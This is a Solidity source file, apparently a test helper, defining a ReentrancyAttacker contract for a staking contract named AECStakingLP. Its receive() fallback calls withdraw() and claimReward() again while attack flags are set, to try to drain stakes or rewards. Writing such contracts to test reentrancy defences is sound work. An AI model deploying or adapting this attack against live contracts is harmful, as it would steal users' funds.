// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IAECStakingLP {
    function stake(uint256 amount, uint8 tierId) external;
    function withdraw() external;
    function claimReward() external;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract ReentrancyAttacker {
    IAECStakingLP public stakingLP;
    IERC20 public lpToken;
    bool public attackWithdrawActive;
    bool public attackClaimActive;

    constructor(address _stakingLP, address _lpToken) {
        stakingLP = IAECStakingLP(_stakingLP);
        lpToken = IERC20(_lpToken);
    }

    function approveLP() external {
        lpToken.approve(address(stakingLP), type(uint256).max);
    }

    function stake(uint256 amount, uint8 tierId) external {
        stakingLP.stake(amount, tierId);
    }

    function attackWithdraw() external {
        attackWithdrawActive = true;
        stakingLP.withdraw();
        attackWithdrawActive = false;
    }

    function attackClaimReward() external {
        attackClaimActive = true;
        stakingLP.claimReward();
        attackClaimActive = false;
    }

    // Fallback to try reentrancy
    receive() external payable {
        if (attackWithdrawActive) {
            stakingLP.withdraw();
        }
        if (attackClaimActive) {
            stakingLP.claimReward();
        }
    }
} 